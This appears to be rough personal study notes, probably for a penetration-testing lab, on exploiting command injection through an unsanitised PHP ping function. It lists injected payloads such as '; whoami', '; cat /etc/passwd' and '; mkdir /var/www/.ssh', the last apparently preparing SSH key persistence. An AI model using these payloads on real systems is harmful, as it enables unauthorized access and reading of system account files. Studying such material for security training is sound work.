#Find your file
#Call your file

#go to the webserver + robots and find the uploads folder 
### The default user for an Apache web server is typically called "www-data" on Debian-based systems like Ubuntu, and "apache" 
### on RedHat-based systems like CentOS, which is a dedicated system user account with limited permissions specifically designed to run the Apache web server process.

### Application on the server is vulnerable,
### allowing execution of arbitrary commands
### User input not validated
### Common example is a SOHO router, with a web page to allow ping
SPECIFY ABSOLUTE PATH EVERYTIME WHILE DOING THIS DO NOT CD 
system("ping -c 1 ".$_GET["ip"]);
###  ^^^contain the following in itâ€™s code
HOW DID WE GET TO THE COMMAND INJECTION ??!!?? we used the robots.txt 
ALWAYS TRY ; whoami 

### Run the following to chain/stack our arbitrary command
; cat /etc/passwd


### find the user you are currently 

pwd 
ls -al

### RSA tokens are hardware devices or software applications that generate a unique code to authenticate a user's access to a network service, server, VPN, or email

; mkdir /var/www/.ssh 

### bellow is done from terminal 

ls -al
